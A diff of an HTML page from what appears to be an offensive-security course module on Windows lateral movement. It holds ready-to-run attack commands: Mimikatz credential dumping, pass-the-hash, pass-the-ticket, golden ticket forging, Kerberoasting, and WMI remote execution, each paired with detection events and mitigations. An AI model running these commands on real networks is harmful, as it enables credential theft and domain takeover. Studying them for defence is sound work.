@@ -12,6 +12,9 @@
             --accent2: #00ff88;
             --dim: #666;
             --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -32,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -83,21 +101,180 @@
             margin-left: 0.5rem;
         }
         .status-live { background: var(--accent2); color: var(--bg); }
-        .method-box {
+        .step-box {
             background: #0f0f15;
-            border: 2px solid #5555ff;
+            border: 1px solid var(--border);
             border-radius: 8px;
             padding: 1.5rem;
-            margin: 1.5rem 0;
+            margin: 1rem 0;
         }
-        .method-box h3 { color: #5555ff; margin-bottom: 0.5rem; }
-        .think-box {
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .copy-paste {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .copy-paste:hover { background: #1a1a30; }
+        .why-box {
             background: #1a1a0a;
             border-left: 4px solid #ffaa00;
             padding: 1rem;
             margin: 1rem 0;
         }
-        .think-box h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .flow-diagram {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .flow-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .flow-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .flow-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .interactive-demo {
+            background: #151515;
+            border: 2px solid var(--accent);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
         .step-number {
             display: inline-block;
             width: 28px;
@@ -120,19 +297,27 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
-        .interactive-demo {
-            background: #151515;
-            border: 2px solid var(--accent);
-            border-radius: 12px;
-            padding: 2rem;
-            margin: 2rem 0;
+        .method-box {
+            background: #0f0f15;
+            border: 2px solid #5555ff;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
         }
+        .method-box h3 { color: #5555ff; margin-bottom: 0.5rem; }
+        .think-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .think-box h4 { color: #ffaa00; margin-bottom: 0.5rem; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_14_CLOUD_FILES.html">← Module 14</a>
             <a href="MODULE_16_C2.html">Module 16 →</a>
         </div>
@@ -144,19 +329,90 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Getting one shell is reconnaissance. Getting the next shell is the mission. Lateral movement is the bridge between initial access and domain dominance. Every technique leaves traces — the defender's job is to spot them; your job is to minimize them.</p>
+            <p>Getting one shell is reconnaissance. Getting the next shell is the mission. <span class="neon-highlight">Lateral movement</span> is the bridge between initial access and domain dominance. Every technique leaves traces — the defender's job is to spot them; your job is to minimize them.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> A single compromised host is an island. The network is the continent. Lateral movement turns a beachhead into an empire. You don't attack the domain controller head-on; you move through workstations, harvest credentials, and let the domain trust you.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>You breached the perimeter. One host is yours. Now what? The network is the battlefield. Lateral movement is flanking maneuver — you don't assault the fortress head-on, you move through the supply lines, the communication trenches, the maintenance tunnels. SSH, WMI, SMB — these are your supply lines.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The defender sees one infected host and thinks "contained." You see a launchpad. Every protocol is a road. Every credential is a vehicle. Every trust relationship is a bridge.</p>
         </div>
 
-        <h2>The Method: How a Hacker Thinks</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>TCP/IP fundamentals, subnetting, port scanning, and protocol analysis. Lateral movement is network traversal — you need to understand the roads before you drive on them.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>Windows automation, remoting, and WMI interaction. Many lateral movement techniques are PowerShell-native or PowerShell-scriptable.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Process manipulation and memory management. Injected payloads often serve as the initial foothold from which lateral movement begins.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Command and control infrastructure. Lateral movement extends your C2 reach from one agent to many.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a></h4>
+                <p>Domain trusts, Kerberos, and authentication protocols. The "lateral" in lateral movement is only possible because of AD's trust model.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>EDR detection, event log analysis, and SIEM correlation. Understanding detection helps you evade it.</p>
+            </div>
+        </div>
+
+        <h2>🗺️ The Lateral Movement Kill Chain</h2>
+        <p>Every lateral movement operation follows the same pattern. Master this pattern and you can adapt any technique:</p>
+
+        <div class="flow-diagram">
+            <div class="flow-step">
+                <h5>1. RECON</h5>
+                <p><span class="neon-highlight">What's nearby?</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Subnet scan, ARP table, routing</p>
+            </div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-step">
+                <h5>2. CREDENTIALS</h5>
+                <p><span class="neon-highlight">What do I have?</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Tokens, hashes, tickets, passwords</p>
+            </div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-step">
+                <h5>3. ACCESS</h5>
+                <p><span class="neon-highlight">What's open?</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">SMB, RDP, SSH, WinRM, WMI</p>
+            </div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-step">
+                <h5>4. EXECUTE</h5>
+                <p><span class="neon-highlight">How do I run code?</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Remote service, scheduled task, WMI event</p>
+            </div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-step">
+                <h5>5. PERSIST</h5>
+                <p><span class="neon-highlight">How do I stay?</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">New C2 agent, backdoor, golden ticket</p>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why this pattern is universal</h5>
+            <p>Windows networks are built for administration. The same protocols that let IT manage 10,000 workstations let you move between them. <span class="neon-amber">The OS can't distinguish between a domain admin and an attacker using stolen domain admin credentials.</span> The authentication is identical. The protocols are identical. The only difference is intent — and the OS doesn't read minds.</p>
+        </div>
+
+        <h2>🎯 The Attacker's Decision Tree</h2>
 
         <div class="method-box">
-            <h3>🧩 The Decision Tree</h3>
-            <p><strong>When I land on a new box, I ask:</strong></p>
+            <h3>🧩 When I Land on a New Box, I Ask:</h3>
             <ol style="margin-left: 1.5rem; line-height: 2;">
                 <li><strong>What am I?</strong> — user, admin, SYSTEM? (whoami /priv)</li>
                 <li><strong>What's nearby?</strong> — subnet, ARP table, routing table (ipconfig, arp -a)</li>
@@ -179,117 +435,967 @@
             </ul>
         </div>
 
-        <h2>Live Evidence: .92 to .42 Lateral Movement</h2>
+        <h2>🔥 Technique 1: Pass-the-Hash (PtH) <span class="difficulty diff-easy">EASY</span></h2>
 
-        <div class="evidence-box">
-            <h3>📊 Real Data: SSH Pivot Test</h3>
-            <p><strong>Source:</strong> .92 (LAPTOP-R32M8MLI, standard user, Kaspersky active) | <strong>Target:</strong> .42 (WUPC, SWu admin) | <strong>Date:</strong> 2026-06-29</p>
+        <div class="method-card" id="pass-the-hash">
+            <h4>Pass-the-Hash: Authentication Without Passwords</h4>
+            <p>Windows stores password hashes in memory (NTLM hashes). You don't need the plaintext password — the hash IS the password for NTLM authentication. <span class="neon-highlight">Pass-the-hash</span> uses a captured hash to authenticate to remote systems without ever cracking it.</p>
 
-            <div class="code-block">
-<span class="step-number">1</span> <strong>RECON: What's nearby?</strong>
-PS C:\Users\gwu07> ipconfig | findstr "IPv4"
-   IPv4 Address. . . . . . . . . . . : 192.168.1.92
-
-PS C:\Users\gwu07> ping 192.168.1.42
-Reply from 192.168.1.42: bytes=32 time=1ms TTL=128
-
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> .42 is alive, 1ms latency = same LAN. TTL=128 = Windows. Target acquired.
-</span>
-
-<span class="step-number">2</span> <strong>ENUMERATE: What protocols?</strong>
-PS C:\Users\gwu07> nmap -sS -p22,445,3389,5985 192.168.1.42
-PORT     STATE SERVICE
-22/tcp   open  ssh
-445/tcp  open  microsoft-ds
-3389/tcp closed ms-wbt-server
-5985/tcp closed wsman
-
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> SSH open = Linux or Windows OpenSSH. 445 open = SMB. No RDP, no WinRM. SSH is my path.
-</span>
-
-<span class="step-number">3</span> <strong>ACCESS: Can I get in?</strong>
-PS C:\Users\gwu07> ssh -o StrictHostKeyChecking=accept-new SWu@192.168.1.42
-SWu@192.168.1.42's password: ********
-Microsoft Windows [Version 10.0.19045.8737]
-
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> I'm in. Standard user on .92 → admin on .42. This is the pivot. Now I have two footholds.
-</span>
-
-<span class="step-number">4</span> <strong>EXFILTRATE: Take a file</strong>
-SWu@WUPC> echo "LATERAL_TEST_FROM_92" > C:\Users\swu\lateral_test.txt
-SWu@WUPC> type C:\Users\swu\lateral_test.txt
-LATERAL_TEST_FROM_92
-
-PS C:\Users\gwu07> scp SWu@192.168.1.42:C:/Users/swu/lateral_test.txt .
-lateral_test.txt                          100%   21     0.2KB/s   00:00
-
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> Bidirectional file transfer confirmed. I can push tools to .42 and pull data back. This is the logistics line.
-</span>
-
-<span class="step-number">5</span> <strong>VERIFY: What did the defender see?</strong>
-SWu@WUPC> Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 5
-# Event 4624: An account was successfully logged on
-# Logon Type 3: Network (SMB/NTLM)
-# Logon Type 10: RemoteInteractive (RDP)
-# Logon Type 8: NetworkCleartext (IIS basic auth)
-
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> SSH logon is Type 3 (Network) on Windows. Event 4624 fired. The defender CAN see this. My counter: the log shows "SWu" logged in — legitimate user, legitimate time. Blend in.
-</span>
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>NTLM is a challenge-response protocol. The server sends a challenge; the client encrypts it with the hash and sends it back. The server verifies by doing the same encryption. <span class="neon-amber">The server never sees the plaintext password.</span> If you have the hash, you can perform the encryption. The server can't tell the difference between a legitimate user and you using their hash.</p>
             </div>
 
-            <p style="margin-top: 1rem;"><strong>Key Finding:</strong> SSH leaves fewer forensic artifacts than RDP (no Session Logon event, no bitmap cache). SMB file transfer leaves Event 5140 (network share accessed). The defender sees "SWu accessed C$" — if they monitor for it.</p>
+            <div class="code-block">
+# === PASS-THE-HASH WITH MIMIKATZ ===
+# Step 1: Extract hashes from LSASS memory
+# Requires: Admin or SYSTEM privileges (see Module 08: Privilege Escalation)
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # sekurlsa::logonpasswords
+
+# Output example:
+# Authentication Id : 0 ; 1234567 (00000000:0012d687)
+# Session           : Interactive from 1
+# User Name         : SWu
+# Domain            : CORP
+# NTLM              : 7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b
+# SHA1              : d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0
+
+# Step 2: Pass the hash to authenticate remotely
+mimikatz # sekurlsa::pth /user:SWu /domain:CORP /ntlm:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b /run:cmd.exe
+
+# A new cmd.exe spawns with SWu's credentials injected
+# From this shell, you can access any resource SWu can access
+            </div>
+
+            <div class="code-block">
+# === PASS-THE-HASH WITH CRACKMAPEXEC ===
+# The modern way — automated, fast, and loud
+
+# Test credentials against multiple targets
+crackmapexec smb 192.168.1.0/24 -u SWu -H 7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b
+
+# Execute command on all reachable hosts
+crackmapexec smb 192.168.1.0/24 -u SWu -H 7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b -x "whoami"
+
+# Dump SAM hashes from all reachable hosts
+crackmapexec smb 192.168.1.0/24 -u SWu -H 7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b --sam
+
+# Cross-link: hash cracking techniques in Module 19: AD
+            </div>
+
+            <div class="code-block">
+# === PASS-THE-HASH WITH IMPACKET (psexec.py) ===
+# Python implementation, works from Linux attack box
+
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b CORP/SWu@192.168.1.42
+
+# The first hash is the LM hash (blank = aad3b435b51404eeaad3b435b51404ee)
+# The second hash is the NTLM hash
+# This gives you a SYSTEM shell on the target
+
+# Alternative: wmiexec.py ( quieter than psexec — no service creation )
+python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b CORP/SWu@192.168.1.42
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>Pass-the-hash generates <span class="neon-highlight">Event ID 4624 (Logon)</span> with <span class="neon-amber">Logon Type 3 (Network)</span> and <span class="neon-amber">Logon Process: NtLmSsp</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>Same NTLM hash used from multiple source IPs</li>
+                    <li>Account logons outside normal business hours</li>
+                    <li>Admin accounts authenticating to workstations (not servers)</li>
+                    <li>Event 4648 (explicit credential use) followed by 4624</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Windows Defender Credential Guard (isolates LSASS), LAPS (unique local admin passwords), and <span class="neon-highlight">KB2871997</span> (prevents local admin PtH on non-elevated sessions).</p>
+            </div>
         </div>
 
-        <h2>Defensive Verification: What the Blue Team Sees</h2>
+        <h2>🔥 Technique 2: Pass-the-Ticket (PtT) <span class="difficulty diff-medium">MEDIUM</span></h2>
+
+        <div class="method-card" id="pass-the-ticket">
+            <h4>Pass-the-Ticket: Kerberos Ticket Reuse</h4>
+            <p>Kerberos tickets are proof of authentication. Once issued, a ticket is valid for its lifetime (typically 10 hours renewable to 7 days). <span class="neon-highlight">Pass-the-ticket</span> extracts a valid Kerberos ticket and injects it into another session, allowing authentication as that user without knowing their password or hash.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>Kerberos is a ticket-based system. The KDC (Key Distribution Center) issues a TGT (Ticket Granting Ticket) after initial authentication. The TGT is used to request service tickets (TGS) for specific resources. <span class="neon-amber">The KDC never sees the ticket after issuance.</span> If you steal a ticket, you can present it to any service that trusts the KDC. The service verifies the ticket's cryptographic signature — not your identity.</p>
+            </div>
+
+            <div class="code-block">
+# === PASS-THE-TICKET WITH MIMIKATZ ===
+# Step 1: Extract Kerberos tickets from memory
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+# Output: Multiple .kirbi files (Kerberos ticket format)
+# [0..00] - 0x00000012 - rc4_hmac_nt      
+#   Start/End/MaxRenew: 6/29/2026 8:00:00 AM ; 6/29/2026 6:00:00 PM ; 7/6/2026 8:00:00 AM
+#   Server Name        : krbtgt/CORP.LOCAL @ CORP.LOCAL
+#   Client Name        : SWu @ CORP.LOCAL
+#   Flags              : 40e10000 -> forwardable renewable initial pre_authent
+#   -> File: [0;7c4f9e2]-0-0-40e10000-SWu@krbtgt-CORP.LOCAL.kirbi
+
+# Step 2: Inject the ticket into your session
+mimikatz # kerberos::ptt [0;7c4f9e2]-0-0-40e10000-SWu@krbtgt-CORP.LOCAL.kirbi
+
+# Step 3: Verify the ticket is active
+mimikatz # kerberos::list
+# Or use Windows built-in: klist
+            </div>
+
+            <div class="code-block">
+# === PASS-THE-TICKET WITH RUBEUS ===
+# The modern C# tool — stealthier, more flexible
+
+# Dump tickets from memory
+Rubeus.exe dump /service:krbtgt /nowrap
+
+# Inject a specific ticket
+Rubeus.exe ptt /ticket:doIFmjCCBZYwggWSoAMCAQ...
+
+# Renew a ticket before it expires
+Rubeus.exe renew /ticket:doIFmjCCBZYwggWSoAMCAQ...
+
+# Convert between ticket formats (kirbi, ccache, base64)
+Rubeus.exe describe /ticket:doIFmjCCBZYwggWSoAMCAQ...
+
+# Cross-link: Kerberos deep dive in Module 19: AD
+            </div>
+
+            <div class="code-block">
+# === GOLDEN TICKET (THE ULTIMATE PTT) ===
+# Forge a TGT for any user using the KRBTGT account hash
+# The KRBTGT hash is the master key of the domain
+
+# Step 1: Get the KRBTGT hash (requires Domain Admin or DCSync)
+mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
+
+# Output:
+# Hash NTLM: 6c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b
+
+# Step 2: Forge a golden ticket for any user (even non-existent)
+mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 \
+    /krbtgt:6c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b /user:Administrator /id:500 /groups:513,512,520 \
+    /ticket:admin_golden.kirbi
+
+# Step 3: Inject and use
+mimikatz # kerberos::ptt admin_golden.kirbi
+
+# Now you are Domain Admin. The ticket is valid for 10 years by default.
+# Even if the user changes their password, this ticket still works.
+# The only fix: rotate the KRBTGT password TWICE (see Module 19: AD)
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>Pass-the-ticket generates <span class="neon-highlight">Event ID 4768 (TGT requested)</span> or <span class="neon-highlight">4769 (TGS requested)</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>TGT requests without preceding 4624 (logon) — ticket injection</li>
+                    <li>TGS requests from unusual source IPs</li>
+                    <li>Golden tickets: TGT with lifetime > 10 hours (forged)</li>
+                    <li>Event 4769 with encryption type 0x17 (rc4_hmac) for sensitive accounts</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Enable PAC validation, monitor for anomalous TGS requests, and rotate KRBTGT password regularly. See <a href="MODULE_19_AD.html" class="cross-link">Module 19: AD</a> for full domain hardening.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 3: Kerberoasting <span class="difficulty diff-medium">MEDIUM</span></h2>
+
+        <div class="method-card" id="kerberoasting">
+            <h4>Kerberoasting: Offline Cracking of Service Accounts</h4>
+            <p>Service accounts often have weak passwords and are rarely rotated. <span class="neon-highlight">Kerberoasting</span> requests a TGS ticket for any service principal name (SPN), which is encrypted with the service account's password hash. You take the ticket offline and crack it — no domain admin required.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>Any authenticated domain user can request a TGS for any SPN. The TGS is encrypted with the service account's password hash. <span class="neon-amber">The KDC doesn't check if you have permission to use the service.</span> It just issues the ticket. You take the encrypted ticket home and crack it at your leisure. Service accounts often have passwords like "Summer2024!" or never-expire legacy passwords.</p>
+            </div>
+
+            <div class="code-block">
+# === KERBEROASTING WITH RUBEUS ===
+# Step 1: Enumerate SPNs (Service Principal Names)
+Rubeus.exe kerberoast /stats
+
+# Output example:
+# SPNs found: 3
+#    User            : sql_svc
+#    SPN             : MSSQLSvc/sql01.corp.local:1433
+#    Hash            : $krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$...
+
+# Step 2: Request and dump TGS tickets for all SPNs
+Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
+
+# Step 3: Crack offline with hashcat
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Mode 13100 = Kerberos 5 TGS-REP etype 23 (rc4-hmac)
+# Service accounts often use RC4 (weak) instead of AES256
+            </div>
+
+            <div class="code-block">
+# === KERBEROASTING WITH POWERVIEW / POWERSHELL ===
+# Step 1: Find SPNs using PowerView (see Module 03: PowerShell)
+Import-Module .\PowerView.ps1
+Get-NetUser -SPN | Select samaccountname, serviceprincipalname
+
+# Step 2: Request tickets with built-in .NET
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"
+
+# Step 3: Export tickets from memory
+mimikatz # kerberos::list /export
+
+# Step 4: Crack with tgsrepcrack.py or hashcat
+python3 tgsrepcrack.py wordlist.txt *.kirbi
+            </div>
+
+            <div class="code-block">
+# === TARGETED KERBEROASTING ===
+# Only request tickets for high-value targets
+
+# Using Rubeus with specific targets
+Rubeus.exe kerberoast /user:sql_svc /domain:CORP.LOCAL /format:hashcat
+
+# Using GetUserSPNs.py from Impacket
+python3 GetUserSPNs.py -request -dc-ip 192.168.1.10 CORP.LOCAL/SWu
+
+# Output includes the hash ready for hashcat:
+# $krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$...
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>Kerberoasting generates <span class="neon-highlight">Event ID 4769 (TGS requested)</span> with <span class="neon-amber">Ticket Encryption Type: 0x17 (RC4-HMAC)</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>Unusual volume of 4769 events from a single account</li>
+                    <li>4769 for sensitive SPNs (MSSQLSvc, HTTP, CIFS) from non-IT users</li>
+                    <li>RC4 encryption requests when AES is available (indicates attack tool)</li>
+                    <li>TGS requests outside normal business hours</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Set service accounts to use AES256 only, enforce strong passwords (25+ chars), rotate regularly, and use Managed Service Accounts (gMSA) where possible. See <a href="MODULE_19_AD.html" class="cross-link">Module 19: AD</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 4: WMI Execution <span class="difficulty diff-easy">EASY</span></h2>
+
+        <div class="method-card" id="wmi-exec">
+            <h4>WMI: Windows Management Instrumentation Remote Execution</h4>
+            <p>WMI is Windows' built-in management framework. It runs over DCOM (TCP port 135 + ephemeral high ports) and allows remote process creation, file operations, and system queries. <span class="neon-highlight">WMIexec</span> is the quietest way to execute commands remotely — no service installation, no scheduled task, just a temporary process.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>WMI is designed for remote administration. When you call <span class="neon-highlight">Win32_Process.Create</span>, the WMI service (wmiprvse.exe) on the target spawns your process. <span class="neon-amber">The process runs as the connecting user.</span> If you connect as admin, your process runs as admin. WMI is rarely monitored because it's "legitimate" — but so is every lateral movement technique.</p>
+            </div>
+
+            <div class="code-block">
+# === WMI EXEC WITH IMPACKET (wmiexec.py) ===
+# The gold standard — semi-interactive shell over WMI
+
+# Basic execution
+python3 wmiexec.py CORP/SWu:Password123@192.168.1.42
+
+# Pass-the-hash variant
+python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b CORP/SWu@192.168.1.42
+
+# Execute single command and exit
+python3 wmiexec.py CORP/SWu:Password123@192.168.1.42 "whoami /all"
+
+# Output goes to a temporary file on target, then deleted
+# This is why WMIexec is quieter than psexec — no persistent service
+            </div>
+
+            <div class="code-block">
+# === WMI EXEC WITH POWERSHELL (Invoke-WmiMethod) ===
+# Native Windows — no external tools needed
+
+# Execute command remotely
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\\temp\\out.txt" -ComputerName 192.168.1.42 -Credential (Get-Credential)
+
+# Execute with specific credentials (pass-the-hash not supported natively)
+$secpass = ConvertTo-SecureString "Password123" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("CORP\SWu", $secpass)
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 192.168.1.42 -Credential $cred
+
+# Query remote system information
+Get-WmiObject -Class Win32_ComputerSystem -ComputerName 192.168.1.42 -Credential $cred
+Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.42 -Credential $cred | Select Name, ProcessId
+
+# Cross-link: PowerShell remoting in Module 03: PowerShell
+            </div>
+
+            <div class="code-block">
+# === WMI EXEC WITH WMIC (LEGACY COMMAND LINE) ===
+# Available on every Windows system since XP
+
+# Execute command
+wmic /node:192.168.1.42 /user:CORP\SWu /password:Password123 process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
+
+# Query processes
+wmic /node:192.168.1.42 /user:CORP\SWu /password:Password123 process list brief
+
+# Query services
+wmic /node:192.168.1.42 /user:CORP\SWu /password:Password123 service list brief
+
